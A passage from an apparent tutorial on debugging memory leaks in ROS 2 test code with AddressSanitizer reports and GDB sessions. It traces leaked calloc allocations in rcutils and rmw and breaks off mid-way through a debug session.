        #5 0x7f5275882c4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
        #6 0x7f52758830d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
        #7 0x7f52784931eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53
        #8 0x7f5278758875 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
        #9 0x55d37431a0ed in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
        #10 0x55d3743d2215 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #11 0x55d3743c4369 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #12 0x55d374370e51 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
        #13 0x55d37437227c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
        #14 0x55d374372e20 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
        #15 0x55d37438df31 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
        #16 0x55d3743d4cc8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #17 0x55d3743c6632 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #18 0x55d37438acc5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
        #19 0x55d37435e214 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
        #20 0x55d37435e15a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
        #21 0x7f527721eb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

    Indirect leak of 8 byte(s) in 1 object(s) allocated from:
        #0 0x7f5278a99d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f52781e54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f52781f7e77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54
        #3 0x7f527588077a in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:238
        #4 0x7f5275882c4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
        #5 0x7f52758830d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
        #6 0x7f52784931eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53
        #7 0x7f5278758875 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
        #8 0x55d37431a0ed in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
        #9 0x55d3743d2215 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #10 0x55d3743c4369 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #11 0x55d374370e51 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
        #12 0x55d37437227c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
        #13 0x55d374372e20 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
        #14 0x55d37438df31 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
        #15 0x55d3743d4cc8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #16 0x55d3743c6632 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #17 0x55d37438acc5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
        #18 0x55d37435e214 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
        #19 0x55d37435e15a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
        #20 0x7f527721eb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

    Indirect leak of 8 byte(s) in 1 object(s) allocated from:
        #0 0x7f5278a99b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
        #1 0x7f52781e5465 in __default_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:35
        #2 0x7f52781f7c2f in rcutils_strndup /opt/ros2_asan_ws/src/ros2/rcutils/src/strdup.c:42
        #3 0x7f52781f7bae in rcutils_strdup /opt/ros2_asan_ws/src/ros2/rcutils/src/strdup.c:33
        #4 0x7f5275880638 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:226
        #5 0x7f5275882c4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
        #6 0x7f52758830d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
        #7 0x7f52784931eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53
        #8 0x7f5278758875 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
        #9 0x55d37431a0ed in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
        #10 0x55d3743d2215 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #11 0x55d3743c4369 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #12 0x55d374370e51 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
        #13 0x55d37437227c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
        #14 0x55d374372e20 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
        #15 0x55d37438df31 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
        #16 0x55d3743d4cc8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #17 0x55d3743c6632 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #18 0x55d37438acc5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
        #19 0x55d37435e214 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
        #20 0x55d37435e15a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
        #21 0x7f527721eb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

    SUMMARY: AddressSanitizer: 103 byte(s) leaked in 5 allocation(s).

    ```</code></pre>
    <p>We can clearly see that the two direct leaks are related to <code>/opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56</code>. As pointed out in the first tutorial and according to ASan documentation [8]:</p>
    <blockquote>
    <p>LSan also differentiates between direct and indirect leaks in its output. This gives useful information about which leaks should be prioritized, because fixing the direct leaks is likely to fix the indirect ones as well.</p>
    </blockquote>
    <p>this tells us where to focus first. Direct leaks from this first report are:</p>
    <pre class="smallcontent"><code>```bash
    Direct leak of 56 byte(s) in 1 object(s) allocated from:
        #0 0x7f4eaf189d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f4eae8d54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f4eae6c6c7e in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:72
        ...
    ```</code></pre>
    <p>and</p>
    <pre class="smallcontent"><code>```bash
    Direct leak of 8 byte(s) in 1 object(s) allocated from:
        #0 0x7f4eaf189d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f4eae8d54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f4eae8e7e77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54
        ...
    ```</code></pre>
    <p>Both correspond to the <code>calloc</code> call at https://github.com/ros2/rcutils/blob/master/src/allocator.c#L56 however with different callers: - https://github.com/ros2/rcutils/blob/master/src/string_array.c#L54 (1) - https://github.com/ros2/rmw/blob/master/rmw/src/names_and_types.c#L72 (2)</p>
    <p>At this point, we could go ahead and inspect the part of the code that fails `<code>src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342</code> however instead, let’s dive a bit into the bug and try to gain more understanding about it deriving it differently.</p>
    <p>Let’s grab gdb and jump into it.</p>
    <h3 id="using-gdb-to-understand-better-the-leak">Using GDB to understand better the leak</h3>
    <p>First, let’s get the environment ready for the debugging:</p>
    <pre class="smallcontent"><code>```bash
    ccache -M 20G # increase cache size
    # Add the following to your .bashrc or .zshrc file and restart your terminal:
    export CC=/usr/lib/ccache/gcc
    export CXX=/usr/lib/ccache/g++
    source /opt/ros2_asan_ws/install-asan/setup.bash
    ```</code></pre>
    <p>We already know where this memory leak is happening, let’s now try to identify the exact environment and cause of it using gdb. We’ll follow a similar strategy to what’s described at [4]:</p>
    <ul>
    <li>Everytime we enter ‘malloc()’ we will ‘save’ the memory allocation requested size in a variable.</li>
    <li>Everytime we return from ‘malloc()’ we will print the size and the return address from ‘malloc()’.</li>
    <li>Everytime we enter ‘free()’ we will print the ‘pointer’ we are about to free.</li>
    </ul>
    <p>Now we use two terminals: - In one we launch the binary <code>test_graph__rmw_fastrtps_cpp</code> - In the other one we’ll be launching gdb as <code>sudo gdb -p $(pgrep test_graph__rmw)</code></p>
    <p>Moreover in the GDB terminal, we’ll be executing the following script [4]:</p>
    <pre class="smallcontent"><code>```bash
    set pagination off
    set breakpoint pending on
    set logging file gdbcmd1.out
    set logging on
    hbreak malloc
    commands
      set $mallocsize = (unsigned long long) $rdi
      continue
    end
    hbreak *(malloc+191)
    commands
      printf &quot;malloc(%lld) = 0x%016llx\n&quot;, $mallocsize, $rax
      continue
    end
    hbreak free
    commands
      printf &quot;free(0x%016llx)\n&quot;, (unsigned long long) $rdi
      continue
    end
    continue
    ```</code></pre>
    <p>This will fail with a message as follows:</p>
    <pre class="smallcontent"><code>```bash
    (gdb) continue
    Continuing.
    Warning:
    Cannot insert hardware breakpoint 1.
    Cannot insert hardware breakpoint 2.
    Could not insert hardware breakpoints:
    You may have requested too many hardware breakpoints/watchpoints.

    Command aborted.
    ```</code></pre>
    <p>Note that this script was literally taken from [4] and there’s no real certainty that the <code>malloc+191</code> offset leads to the point where we can fetch the pointer that points to the allocated portion of memory in the heap. A quick check with gdb points out that the debugger never breaks here.</p>
    <p>Moreover, it seems that the way this script is coded, we need to limit the places where we insert hardware breakpoints or simply dig more specifically. We need to dig deeper.</p>
    <p>Let’s get a more comfortable environment for debugging (note that depending on what you’re doing with gdb, this can be anying so feel free to remove the <code>~/.gdbinit</code> file if that’s the case):</p>
    <pre class="smallcontent"><code>```bash
    wget -P ~ git.io/.gdbinit
    ```</code></pre>
    <p>Breaking in <code>__default_zero_allocate</code> shows us the information we need to diagnose the leak size:</p>
    <details>
    <summary>
    Debug session 1
    </summary>
    <pre class="smallcontent"><code>```bash
    gdb ./test_graph__rmw_fastrtps_cpp
    GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
    Copyright (C) 2018 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
    and &quot;show warranty&quot; for details.
    This GDB was configured as &quot;x86_64-linux-gnu&quot;.
    Type &quot;show configuration&quot; for configuration details.
    For bug reporting instructions, please see:
    &lt;http://www.gnu.org/software/gdb/bugs/&gt;.
    Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
    For help, type &quot;help&quot;.
    Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
    Reading symbols from ./test_graph__rmw_fastrtps_cpp...done.
    &gt;&gt;&gt; b __default_zero_allocate
    Function &quot;__default_zero_allocate&quot; not defined.
    Make breakpoint pending on future shared library load? (y or [n]) y
    Breakpoint 1 (__default_zero_allocate) pending.
    &gt;&gt;&gt; r
    Starting program: /opt/ros2_asan_ws/build-asan/rcl/test/test_graph__rmw_fastrtps_cpp
    ─── Output/messages ────────────────────────────────────────────────────────────────────
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
    Running main() from /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc
    [==========] Running 14 tests from 2 test cases.
    [----------] Global test environment set-up.
    [----------] 11 tests from TestGraphFixture__rmw_fastrtps_cpp
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_and_destroy_topic_names_and_types
    ─── Assembly ───────────────────────────────────────────────────────────────────────────
    0x00007ffff66444b8 __default_zero_allocate+8  mov    %rdi,-0x8(%rbp)
    0x00007ffff66444bc __default_zero_allocate+12 mov    %rsi,-0x10(%rbp)
    0x00007ffff66444c0 __default_zero_allocate+16 mov    %rdx,-0x18(%rbp)
    0x00007ffff66444c4 __default_zero_allocate+20 mov    -0x10(%rbp),%rdx
    0x00007ffff66444c8 __default_zero_allocate+24 mov    -0x8(%rbp),%rax
    0x00007ffff66444cc __default_zero_allocate+28 mov    %rdx,%rsi
    0x00007ffff66444cf __default_zero_allocate+31 mov    %rax,%rdi
    ─── Expressions ────────────────────────────────────────────────────────────────────────
    ─── History ────────────────────────────────────────────────────────────────────────────
    ─── Memory ─────────────────────────────────────────────────────────────────────────────
    ─── Registers ──────────────────────────────────────────────────────────────────────────
       rax 0x00007ffff66444b0       rbx 0x00007fffffff1cf0       rcx 0x0000000000000000
       rdx 0x0000000000000000       rsi 0x0000000000000058       rdi 0x0000000000000001
       rbp 0x00007ffffffefe40       rsp 0x00007ffffffefe20        r8 0x0000000000000000
        r9 0x0000000000000000       r10 0x0000000000000022       r11 0x00007ffff6648fab
       r12 0x00000fffffffdfde       r13 0x00007ffffffefef0       r14 0x0000603000033730
       r15 0x00007ffffffefef0       rip 0x00007ffff66444c4    eflags [ IF ]
        cs 0x00000033                ss 0x0000002b                ds 0x00000000
        es 0x00000000                fs 0x00000000                gs 0x00000000
    ─── Source ─────────────────────────────────────────────────────────────────────────────
    51
    52 static void *
    53 __default_zero_allocate(size_t number_of_elements, size_t size_of_element, void * state)
    54 {
    55   RCUTILS_UNUSED(state);
    56   return calloc(number_of_elements, size_of_element);
    57 }
    58
    59 rcutils_allocator_t
    60 rcutils_get_zero_initialized_allocator(void)
    61 {
    ─── Stack ──────────────────────────────────────────────────────────────────────────────
    [0] from 0x00007ffff66444c4 in __default_zero_allocate+20 at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    arg number_of_elements = 1
    arg size_of_element = 88
    arg state = 0x0
    [1] from 0x00007ffff6bba48a in rcl_init+1991 at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/init.c:78
    arg argc = 0
    arg argv = 0x0
    arg options = 0x7fffffff2000
    arg context = 0x603000033730
    [+]
    ─── Threads ────────────────────────────────────────────────────────────────────────────
    [1] id 16950 name test_graph__rmw from 0x00007ffff66444c4 in __default_zero_allocate+20 at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    ────────────────────────────────────────────────────────────────────────────────────────

    Breakpoint 1, __default_zero_allocate (number_of_elements=1, size_of_element=88, state=0x0) at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    56    return calloc(number_of_elements, size_of_element);
    ```</code></pre>
    </details>
    <p>in this case, the <code>size_of_element</code> is 88 bytes, we will focus first on the 56 bytes leaked. Searching, eventually we’ll find:</p>
    <details>
    <summary>
    Debug session 2
    </summary>
    <pre class="smallcontent"><code>```bash
    ─── Assembly ───────────────────────────────────────────────────────────────────────────
    0x00007ffff66444b8 __default_zero_allocate+8  mov    %rdi,-0x8(%rbp)
    0x00007ffff66444bc __default_zero_allocate+12 mov    %rsi,-0x10(%rbp)
    0x00007ffff66444c0 __default_zero_allocate+16 mov    %rdx,-0x18(%rbp)
    0x00007ffff66444c4 __default_zero_allocate+20 mov    -0x10(%rbp),%rdx
    0x00007ffff66444c8 __default_zero_allocate+24 mov    -0x8(%rbp),%rax
    0x00007ffff66444cc __default_zero_allocate+28 mov    %rdx,%rsi
    0x00007ffff66444cf __default_zero_allocate+31 mov    %rax,%rdi
    ─── Expressions ────────────────────────────────────────────────────────────────────────
    ─── History ────────────────────────────────────────────────────────────────────────────
    ─── Memory ─────────────────────────────────────────────────────────────────────────────
    ─── Registers ──────────────────────────────────────────────────────────────────────────
       rax 0x00007ffff66444b0       rbx 0x00007fffffff0a90       rcx 0x0000000000000001
       rdx 0x0000000000000000       rsi 0x0000000000000038       rdi 0x0000000000000001
       rbp 0x00007ffffffef990       rsp 0x00007ffffffef970        r8 0x0000000000000000
        r9 0x0000000000000000       r10 0x00007ffffffef190       r11 0x00007ffffffef190
       r12 0x00007ffffffef9d0       r13 0x00000fffffffdf3a       r14 0x00007ffffffef9d0
       r15 0x00007fffffff0b70       rip 0x00007ffff66444c4    eflags [ IF ]
        cs 0x00000033                ss 0x0000002b                ds 0x00000000
        es 0x00000000                fs 0x00000000                gs 0x00000000
    ─── Source ─────────────────────────────────────────────────────────────────────────────
    51
    52 static void *
    53 __default_zero_allocate(size_t number_of_elements, size_t size_of_element, void * state)
    54 {
    55   RCUTILS_UNUSED(state);
    56   return calloc(number_of_elements, size_of_element);
    57 }
    58
    59 rcutils_allocator_t
    60 rcutils_get_zero_initialized_allocator(void)
    61 {
    ─── Stack ──────────────────────────────────────────────────────────────────────────────
    [0] from 0x00007ffff66444c4 in __default_zero_allocate+20 at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    arg number_of_elements = 1
    arg size_of_element = 56
    arg state = 0x0
    [1] from 0x00007ffff6435c7f in rmw_names_and_types_init+629 at /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:72
    arg names_and_types = 0x7fffffff1e40
    arg size = 1
    arg allocator = 0x7fffffff1330
    [+]
    ─── Threads ────────────────────────────────────────────────────────────────────────────
    [10] id 16963 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [9] id 16962 name test_graph__rmw from 0x00007ffff5fff10d in __lll_lock_wait+29 at ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S:135
    [8] id 16961 name test_graph__rmw from 0x00007ffff295f4c0 in std::chrono::duration_cast&lt;std::chrono::duration&lt;long, std::ratio&lt;1l, 1000000000l&gt; &gt;, long, std::ratio&lt;1l, 1000000l&gt; &gt;+0 at /usr/include/c++/7/chrono:194
    [7] id 16960 name test_graph__rmw from 0x00007ffff2967be6 in std::vector&lt;asio::detail::timer_queue&lt;asio::detail::chrono_time_traits&lt;std::chrono::_V2::steady_clock, asio::wait_traits&lt;std::chrono::_V2::steady_clock&gt; &gt; &gt;::heap_entry, std::allocator&lt;asio::detail::timer_queue&lt;asio::detail::chrono_time_traits&lt;std::chrono::_V2::steady_clock, asio::wait_traits&lt;std::chrono::_V2::steady_clock&gt; &gt; &gt;::heap_entry&gt; &gt;::end at /usr/include/c++/7/bits/stl_vector.h:591
    [6] id 16959 name test_graph__rmw from 0x00007ffff5ffb9f3 in futex_wait_cancelable+27 at ../sysdeps/unix/sysv/linux/futex-internal.h:88
    [5] id 16958 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [4] id 16957 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [3] id 16956 name test_graph__rmw from 0x00007ffff28f77c6 in eprosima::fastrtps::rtps::ReaderProxy** std::__copy_move_a&lt;true, eprosima::fastrtps::rtps::ReaderProxy**, eprosima::fastrtps::rtps::ReaderProxy**&gt;(eprosima::fastrtps::rtps::ReaderProxy**, eprosima::fastrtps::rtps::ReaderProxy**, eprosima::fastrtps::rtps::ReaderProxy**)@plt
    [2] id 16955 name test_graph__rmw from 0x00007ffff577dbb7 in epoll_wait+87 at ../sysdeps/unix/sysv/linux/epoll_wait.c:30
    [1] id 16950 name test_graph__rmw from 0x00007ffff66444c4 in __default_zero_allocate+20 at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    ────────────────────────────────────────────────────────────────────────────────────────

    Thread 1 &quot;test_graph__rmw&quot; hit Breakpoint 1, __default_zero_allocate (number_of_elements=1, size_of_element=56, state=0x0) at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    56    return calloc(number_of_elements, size_of_element);
    ```</code></pre>
    </details>
    <p>Let’s debug and play with calloc (not malloc) and free again. To do so, we’ll break at <code>__default_zero_allocate</code> and manually figure out the returned address:</p>
    <details>
    <summary>
    Debug session 3
    </summary>
    <pre class="smallcontent"><code>```bash
    ─── Assembly ─────────────────────────────────────────────────────────────────────────────────
    0x00007ffff66444cc __default_zero_allocate+28 mov    %rdx,%rsi
    0x00007ffff66444cf __default_zero_allocate+31 mov    %rax,%rdi
    0x00007ffff66444d2 __default_zero_allocate+34 callq  0x7ffff6643dd0 &lt;calloc@plt&gt;
